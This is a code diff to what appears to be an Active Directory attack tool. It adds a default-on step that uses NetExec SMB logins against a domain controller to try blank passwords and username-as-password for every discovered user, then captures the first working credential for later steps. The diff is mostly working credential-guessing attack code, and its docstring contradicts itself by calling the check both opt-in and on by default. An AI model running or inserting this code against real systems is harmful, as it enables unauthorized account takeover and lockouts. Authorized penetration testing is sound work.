@@ -213,6 +213,7 @@ class Config:
     no_discover: bool = False
     users_file: str = ""           # path to user list; auto-falls back to SecLists
     spray_password: str = ""       # single password to spray; empty = skip spray
+    no_weak_pw: bool = False       # opt out of blank + username-as-password tests (on by default)
     discovered_users: list = field(default_factory=list, repr=False)
 
     # Authentication-reflection bypass options (v4.8.0 — Synacktiv 2026 chain)
@@ -3201,6 +3202,50 @@ def _password_spray(cfg: Config, users: list[str], password: str) -> bool:
     return False
 
 
+def _test_weak_credentials(cfg: Config, users: list[str]) -> bool:
+    """Opt-in low-volume weak-password checks against the discovered users:
+    blank password and username-as-password. One attempt per user per check
+    (two auth attempts/user total) — this ticks badPwdCount. On by default;
+    disable with --no-weak-pw if the domain has an aggressive lockout policy.
+    Sets cfg creds on the first hit; returns True if any credential was found."""
+    if not (tool_exists("nxc") and users and cfg.dc_ip):
+        return False
+    user_file = cfg.work_dir / "weakpw-users.txt"
+    user_file.write_text("\n".join(users) + "\n")
+
+    # (label, slug, extra password args). --no-bruteforce pairs the user/pass
+    # files line-by-line, so feeding the user list as the password file tests
+    # sAMAccountName == password.
+    checks = [
+        ("blank password",       "blank",    ["-p", ""]),
+        ("username-as-password", "userpass", ["-p", str(user_file), "--no-bruteforce"]),
+    ]
+    hit = False
+    for label, slug, pw_args in checks:
+        out_file = cfg.work_dir / f"weakpw-{slug}.txt"
+        cmd = ["nxc", "smb", cfg.dc_ip, "-u", str(user_file), "-d", cfg.domain,
+               "--continue-on-success"] + pw_args
+        log.info(f"🔍 Weak-password check ({label}) across {len(users)} user(s)")
+        result = run(cmd, cfg, timeout=600, outfile=out_file)
+        if not out_file.exists():
+            continue
+        for line in out_file.read_text(errors="replace").splitlines():
+            # nxc success: "SMB <ip> 445 <host> [+] DOMAIN\\user:pass (...)"
+            m = re.search(r"\[\+\]\s+\S+?\\([^:\s]+):(\S*)", line)
+            if not m:
+                continue
+            user, pw = m.group(1), m.group(2)
+            if not user or user.lower() == "guest":
+                continue
+            ok(f"🔑 Weak credential: {user} / '{pw}' ({label})")
+            if not cfg.has_creds:
+                cfg.username, cfg.password = user, pw
+            hit = True
+    if not hit:
+        detail("No blank / username-as-password credentials found")
+    return hit
+
+
 def run_credential_discovery(cfg: Config) -> bool:
     """Pre-cut credential discovery: 6 zero-auth foothold techniques.
 
@@ -3276,6 +3321,16 @@ def run_credential_discovery(cfg: Config) -> bool:
             return True
     except Exception as e:
         log.warning(f"pre2k auto-test failed: {e}")
+
+    # Step 4.5: Weak-password checks (on by default — makes auth attempts)
+    if not cfg.no_weak_pw:
+        try:
+            if _test_weak_credentials(cfg, cfg.discovered_users):
+                return True
+        except Exception as e:
+            log.warning(f"Weak-password check failed: {e}")
+    else:
+        detail("--no-weak-pw — skipping blank/username-as-password tests")
 
     # Step 5: Spray (only if user explicitly opted in)
     if cfg.spray_password:
@@ -9355,6 +9410,8 @@ def parse_args() -> Config:
                       help="Path to candidate username list (default: SecLists)")
     disc.add_argument("--spray-password", default="",
                       help="Single password to spray across discovered users (lockout-aware: one attempt per user)")
+    disc.add_argument("--no-weak-pw", action="store_true",
+                      help="Skip blank + username-as-password tests (on by default; 2 auth attempts/user, ticks lockout)")
 
     refl = p.add_argument_group("Authentication-reflection bypass (Synacktiv 2026)")
     refl.add_argument("--unicode-spn", action="store_true",
@@ -9438,6 +9495,7 @@ def parse_args() -> Config:
         no_discover=args.no_discover,
         users_file=args.users_file,
         spray_password=args.spray_password,
+        no_weak_pw=args.no_weak_pw,
         unicode_spn=args.unicode_spn,
         no_ghost_spn=args.no_ghost_spn,
         no_loopback_check=args.no_loopback_check,
